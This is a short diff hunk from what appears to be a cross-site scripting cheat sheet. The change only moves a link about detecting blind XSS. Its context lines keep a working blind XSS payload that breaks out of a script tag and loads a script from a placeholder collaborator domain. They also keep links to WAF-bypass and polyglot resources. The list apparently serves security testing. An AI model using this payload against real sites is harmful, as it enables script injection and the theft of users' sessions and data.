@@ -9,10 +9,11 @@ https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-
 
 Blind XSS
 [+] </script><svg/onload='+/"/+/onmouseover=1/+(s=document.createElement(/script/.source), s.stack=Error().stack, s.src=(/,/+/yourcollaboratordomain/).slice(2), document.documentElement.appendChild(s))//'>
+[+] https://nzt-48.org/detection-of-blind-xss
 
 [+] XSS Polyglot
 [+] https://web.archive.org/web/20160323082941/http://polyglot.innerht.ml/
-[+] https://nzt-48.org/detection-of-blind-xss
+
 
 
 
